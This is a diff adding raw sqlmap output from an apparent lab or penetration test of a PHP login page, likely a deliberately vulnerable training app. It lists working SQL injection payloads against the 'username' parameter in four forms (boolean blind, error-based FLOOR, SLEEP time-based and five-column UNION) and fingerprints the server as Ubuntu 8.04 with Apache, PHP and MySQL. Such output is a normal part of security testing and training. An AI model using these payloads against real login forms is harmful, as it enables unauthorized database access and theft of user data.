@@ -1,0 +1,22 @@
+sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=bwSr' OR NOT 6446=6446#&password=LpkM&login-php-submit-button=Login
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: username=bwSr' OR ROW(7677,7667)>(SELECT COUNT(*),CONCAT(0x71787a6b71,(SELECT (ELT(7677=7677,1))),0x7162707071,FLOOR(RAND(0)*2))x FROM (SELECT 6138 UNION SELECT 5641 UNION SELECT 5019 UNION SELECT 2395)a GROUP BY x)-- aszQ&password=LpkM&login-php-submit-button=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=bwSr' AND (SELECT 1278 FROM (SELECT(SLEEP(5)))WDFZ)-- doXl&password=LpkM&login-php-submit-button=Login
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: username=bwSr' UNION ALL SELECT NULL,CONCAT(0x71787a6b71,0x6a464d4f476472677566504e5663685347666150705a6159766e6c4b68464f6c77586a6868724a43,0x7162707071),NULL,NULL,NULL#&password=LpkM&login-php-submit-button=Login
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
